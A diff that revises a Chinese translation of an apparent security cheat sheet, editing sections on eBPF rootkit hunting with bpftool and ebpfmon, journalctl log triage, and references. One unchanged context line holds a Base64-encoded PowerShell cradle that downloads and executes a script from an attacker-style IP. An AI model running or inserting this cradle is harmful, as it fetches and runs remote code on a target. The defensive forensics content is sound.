@@ -129,7 +129,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## Windows 下的 Bash
+## Windows 中的 Bash
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -301,9 +301,9 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF 遥测与 Rootkit 搜寻
+## eBPF Telemetry & Rootkit Hunting
 
-现代 Rootkit（TripleCross、BPFDoor 变体等）越来越多地以隐藏的 eBPF 程序形式实现持久化。使用 `bpftool`/`eBPFmon` 为你的整个 fleet 建立基线，以便在卸载它们之前发现未签名的程序、异常的 cgroup hook 或恶意的 map 内容。
+现代 rootkit（TripleCross、BPFDoor variants 等）越来越多地以隐藏的 eBPF programs 形式持久化。使用 `bpftool`/`eBPFmon` 为你的 fleet 建立基线，以便在 detach 它们之前发现未签名的 programs、异常的 cgroup hooks 或恶意的 map contents。<sup>[[1]](#references)</sup>
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -321,11 +321,11 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-将 bpftool 输出与预期的 NIC/cgroup attachments 进行关联；突然出现由未批准 PID 所拥有的 `xdp` 或 `kprobe` 程序，是 payload 被注入的强烈迹象。
+将 bpftool 输出与预期的 NIC/cgroup attachments 进行关联；突然出现由未经批准的 PID 所拥有的 `xdp` 或 `kprobe` 程序，是 payload 注入 eBPF 的强烈迹象。
 
 ## Journald 事件分诊
 
-systemd-journald 会保留结构化元数据，因此无需接触 `/var/log/*`，即可按 boot、severity、unit 或 UID 进行 pivot。将 filters 与相对时间戳结合，可以快速隔离攻击窗口或证明日志遭到篡改。
+systemd-journald 会保留结构化元数据，因此你可以按 boot、severity、unit 或 UID 进行 pivot，而无需接触 `/var/log/*`。将 filters 与 relative timestamps 结合起来，可以快速隔离攻击窗口或证明日志被篡改。<sup>[[2]](#references)</sup>
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -336,11 +336,11 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-添加 `--grep 'Invalid user' --case-sensitive` 或 `-k`（仅 kernel ring buffer），以便需要更严格的过滤条件时使用；并记住，`_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME` 和 `_TRANSPORT` selectors 可以组合使用，以进行 multi-tenant 检索。
+需要更严格的过滤条件时，添加 `--grep 'Invalid user' --case-sensitive` 或 `-k`（仅限 kernel ring buffer），并记住 `_PID`、`_SYSTEMD_UNIT`、`_HOSTNAME` 和 `_TRANSPORT` selectors 会叠加使用，以便进行多租户排查。
 
-## References
+## 参考资料
 
-- [eBPFmon：探索和交互 eBPF 应用的新工具](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [如何使用 journalctl 命令查看 Linux 日志](https://www.hostinger.com/tutorials/journalctl-command)
+- [1] [eBPFmon：用于探索和交互 eBPF 应用的新工具](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [2] [如何使用 journalctl 命令查看 Linux 日志](https://www.hostinger.com/tutorials/journalctl-command)
 
 {{#include ../../banners/hacktricks-training.md}}
